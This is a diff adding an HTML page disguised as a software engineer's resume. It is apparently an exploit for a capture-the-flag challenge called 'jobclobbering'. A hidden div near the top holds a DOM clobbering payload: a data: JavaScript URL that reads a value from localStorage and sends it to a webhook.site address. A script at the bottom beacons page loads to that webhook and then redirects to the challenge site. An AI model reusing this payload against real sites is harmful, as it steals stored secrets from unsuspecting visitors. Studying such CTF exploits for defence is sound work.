@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Software Engineer Resume - John Doe</title>
+    <meta charset="UTF-8">
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .section { margin-bottom: 20px; }
+        h1 { color: #2c3e50; }
+        h2 { color: #34495e; border-bottom: 2px solid #3498db; }
+    </style>
+</head>
+<body>
+    <!-- DOM Clobbering payload to override window.utilsJS -->
+    <div id="utilsJS">
+        <div id="url">data:text/javascript,try{console.log('[ATTACK] Malicious script executed!');var flag=localStorage.getItem('flag');console.log('[ATTACK] Flag found:',flag);if(flag){var img=new Image();img.src='https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?flag='+encodeURIComponent(flag)+'&source=jobclobbering_attack&t='+Date.now();console.log('[ATTACK] Flag sent to webhook');}}catch(e){console.error('[ATTACK] Error:',e);}</div>
+    </div>
+
+    <div class="header">
+        <h1>John Doe</h1>
+        <p>Senior Software Engineer</p>
+        <p>Email: john.doe@email.com | Phone: (555) 123-4567</p>
+        <p>LinkedIn: linkedin.com/in/johndoe | GitHub: github.com/johndoe</p>
+    </div>
+
+    <div class="section">
+        <h2>Professional Summary</h2>
+        <p>Experienced software engineer with 5+ years in full-stack development, specializing in JavaScript, Python, and cloud technologies. Proven track record of delivering scalable web applications and leading development teams.</p>
+    </div>
+
+    <div class="section">
+        <h2>Technical Skills</h2>
+        <ul>
+            <li><strong>Languages:</strong> JavaScript, Python, Java, TypeScript, SQL</li>
+            <li><strong>Frontend:</strong> React, Vue.js, HTML5, CSS3, Bootstrap</li>
+            <li><strong>Backend:</strong> Node.js, Express, Django, Flask</li>
+            <li><strong>Databases:</strong> PostgreSQL, MongoDB, Redis</li>
+            <li><strong>Cloud:</strong> AWS, Docker, Kubernetes</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>Work Experience</h2>
+        <h3>Senior Software Engineer - TechCorp (2021-Present)</h3>
+        <ul>
+            <li>Led development of microservices architecture serving 1M+ users</li>
+            <li>Reduced application load time by 40% through optimization</li>
+            <li>Mentored junior developers and conducted code reviews</li>
+        </ul>
+
+        <h3>Software Engineer - StartupXYZ (2019-2021)</h3>
+        <ul>
+            <li>Built responsive web applications using React and Node.js</li>
+            <li>Implemented CI/CD pipelines reducing deployment time by 60%</li>
+            <li>Collaborated with product team to define technical requirements</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>Education</h2>
+        <p><strong>Bachelor of Science in Computer Science</strong><br>
+        University of Technology, 2019</p>
+    </div>
+
+    <script>
+        console.log('[INIT] Resume page loaded');
+        console.log('[INIT] Current URL:', window.location.href);
+        
+        // 发送页面加载信号
+        try {
+            const img = new Image();
+            img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=resume_loaded&url=' + encodeURIComponent(window.location.href) + '&t=' + Date.now();
+        } catch (e) {
+            console.error('[INIT] Failed to send load signal:', e);
+        }
+
+        // 检查DOM clobbering
+        console.log('[INIT] DOM Clobbering check:');
+        console.log('[INIT] window.utilsJS:', window.utilsJS);
+        console.log('[INIT] window.utilsJS.url:', window.utilsJS?.url);
+
+        // 自动跳转到挑战网站的messages页面
+        setTimeout(() => {
+            console.log('[REDIRECT] Redirecting to target site...');
+            
+            // 发送跳转前信号
+            try {
+                const img = new Image();
+                img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=before_redirect&target=jobclobbering&t=' + Date.now();
+            } catch (e) {}
+            
+            // 跳转到挑战网站的messages页面
+            window.location.href = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/#messages';
+        }, 2000);
+    </script>
+</body>
+</html>
